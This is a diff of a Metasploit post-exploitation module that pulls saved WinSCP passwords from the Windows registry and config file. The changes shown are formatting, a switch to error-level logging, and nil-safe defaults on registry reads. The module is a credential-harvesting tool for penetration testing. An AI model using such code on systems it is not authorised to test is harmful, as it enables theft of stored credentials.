@@ -23,20 +23,19 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
-		super( update_info( info,
-				'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
-				'Description'   => %q{
-					This module extracts weakly encrypted saved passwords from
-					WinSCP. It searches for saved sessions in the Windows Registry
-					and the WinSCP.ini file. It cannot decrypt passwords if a master
-					password is used.
-					},
-				'License'       => MSF_LICENSE,
-				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
-
+		super(update_info(info,
+			'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
+			'Description'   => %q{
+				This module extracts weakly encrypted saved passwords from
+				WinSCP. It searches for saved sessions in the Windows Registry
+				and the WinSCP.ini file. It cannot decrypt passwords if a master
+				password is used.
+				},
+			'License'       => MSF_LICENSE,
+			'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
 	end
 
 	def get_reg
@@ -56,7 +55,7 @@ class Metasploit3 < Msf::Post
 			regexists = 1
 			if masterpw == 1
 				# Master Password used to add AES256 encryption to stored password
-				print_status("User #{hive['HKU']} is using a Master Password, cannot recover passwords")
+				print_error("User #{hive['HKU']} is using a Master Password, cannot recover passwords")
 				next
 
 			else
@@ -81,9 +80,9 @@ class Metasploit3 < Msf::Post
 						portnum = 22
 					end
 					
-					user = registry_getvaldata(active_session, 'UserName')
-					host = registry_getvaldata(active_session, 'HostName')
-					proto = registry_getvaldata(active_session, 'FSProtocol')
+					user = registry_getvaldata(active_session, 'UserName') || ""
+					host = registry_getvaldata(active_session, 'HostName') || ""
+					proto = registry_getvaldata(active_session, 'FSProtocol') || ""
 
 					# If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0
 					# it is set to SCP.
